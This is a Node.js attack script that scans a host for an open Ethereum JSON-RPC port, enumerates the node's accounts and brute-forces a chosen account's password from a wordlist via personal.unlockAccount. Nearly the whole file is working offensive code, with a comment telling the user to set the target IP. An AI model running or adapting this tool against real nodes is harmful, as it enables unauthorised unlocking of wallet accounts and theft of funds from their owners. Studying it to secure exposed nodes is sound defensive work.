const colors = require('colors');
console.log("Author: Alex Devassy".bold.brightGreen.bgBlack)
console.log("Initiating Port Scanning, Detecting Blockchain Nodes, BruteForcer".bold.brightGreen.bgBlack)
var evilscan = require('evilscan');
const readline = require('readline');
const fs = require('fs');
const rl = readline.createInterface({
                        input: process.stdin, 
			output: process.stdout
                        });

var Web3 = require('web3')

var options = {
    target:'127.0.0.1', //Change this into corresponding IP address
    port:'8545',        //Change this to suspected port number
    status:'TROU', // Timeout, Refused, Open, Unreachable
    banner:true
};

new evilscan(options, (err, scan) =>{

    if (err) {
        console.log("Unknown Error".green);
        return;
    }

    scan.on('result',function(data) {
        // fired when item is matching options
        if (data.status == "open"){
                console.log("Port: ".green+options.port.bold.green+" : Status: ".green+data.status.bold.red);
                let web3 = new Web3(new Web3.providers.HttpProvider("http://"+options.target+":"+options.port));
		web3.eth.net.isListening((e,r)=>{
                	if(r==true){
                        	console.log("Established Connection With Truffle Node".green)
                        	let accounts = web3.eth.getAccounts((er,re)=>{
                        		if (!re){
                        			console.log("Accounts Enumeration Is Not Possible".green)
                        		}
                        		else{
                        			var accounts_count=1;
                        			console.log("Enumerating For Possible Accounts".green)
                        			for(ele in re){
                        				console.log(accounts_count+".  "+re[ele]) 
                        				accounts_count=accounts_count+1;
                        			}

						rl.question('Please Select An Account To Start Brute Forcing: '.green, (answer1) => {
							var ele =0;
							answer1=answer1-1
							for(ele in re){
								if(answer1==ele){
									var set=1;
									console.log("You Have Selected The Account : ".green+re[answer1].bold.green)
								}
							ele=ele+1 
							}
							if(set !=1){
								console.log("Please enter a valid account".bold.red);
							}else{
								const rl2 = readline.createInterface({
                      							input: fs.createReadStream('passwords.txt'), //Input file path 
                        					});
								var count=1;
								var account_address = re[answer1];
								console.log("Commencing Brute Force On: ".green+account_address.green)
								rl2.on('line', function(line) {
									web3.eth.personal.unlockAccount(account_address,line,(error,result)=>{
                                					if(result != true){
                                        					console.log("Attempting Password: "+line+" :Wrong Password".yellow); 
                                					}
                                					else if(result == true){
                                        					console.log("Attempting Password: ".bold.green+line.bold.red+" => Sucessfull Brute Forceing".bold.green);
                                					}
                        					});
                        					count=count+1;
		                        			}); // Closing of rl2.on
							} //Closing of else(set !=1 )
						}); //Closing of rl
					} //Closing of else of re
				}); // Closing of web3.eth.getAccounts
			 } //Closing if(r == true) 
                else{
                        console.log("Failed To Establish A Connection With Blockchain Node".red)
                }
                }); //Clsoing of lisetning
} //Closing of if(port == open) 
else{
console.log("Port: ".green+options.port.bold.green+" : Status: ".green+data.status.bold.red);
}

});

    scan.on('error',function(err) {
        throw new Error(data.toString());
    });

    scan.on('done',function() {
        // finished !
    });

    scan.run();

});
